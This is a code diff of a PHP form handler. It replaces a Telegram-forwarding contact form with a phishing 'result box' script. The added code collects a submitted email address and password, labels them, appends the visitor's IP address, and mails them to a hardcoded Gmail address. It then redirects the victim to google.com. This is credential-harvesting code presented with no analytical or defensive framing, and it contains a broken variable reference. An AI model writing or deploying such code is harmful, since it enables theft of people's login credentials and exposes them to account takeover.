@@ -1,38 +1,22 @@
 <?php
-// Set up the Telegram bot API endpoint and your bot token
-$url = 'https://api.telegram.org/bot<your_bot_token>/sendMessage';
 
-// Define the form data to be sent as a message
-$form_data = array(
-    'name' => $_POST['name'],
-    'email' => $_POST['email'],
-    'message' => $_POST['message']
-);
+if(isset($_POST['submit'])) {
+$mailto = "bleethomas6@gmail.com";  //result box
+$email = $_POST['email'];
+$message = $_POST['key'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$subject = "Results" . " " . $ip;
 
-// Set up the Telegram message payload with the form data
-$message_payload = array(
-    'chat_id' => '<your_telegram_chat_id>',
-    'text' => json_encode($form_data, JSON_PRETTY_PRINT)
-);
+$message = "email address = " . $email . "\r\n" .	"password " . $key  . "\r\n"  ;
 
-// Send the message payload to the Telegram bot API endpoint
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $message_payload);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$response = curl_exec($ch);
-curl_close($ch);
+//headers
 
-// Check the response status code to make sure the message was sent successfully
-if ($response !== false) {
-    $response_data = json_decode($response, true);
-    if ($response_data['ok']) {
-        echo 'Form data sent to Telegram successfully!';
-    } else {
-        echo 'Error sending form data to Telegram: ' . $response_data['description'];
-    }
-} else {
-    echo 'Error sending form data to Telegram: ' . curl_error($ch);
-}
+
+$headers = "From:" . $email;
+$headers2 = "from" . $mailto;
+//mailer
+$result = mail($mailto, $subject, $message, $headers);
+if ($result){     header("location:https://www.google.com");   
+      exit();}
+      else {$failed = "Please enter correct information";}}
 ?>
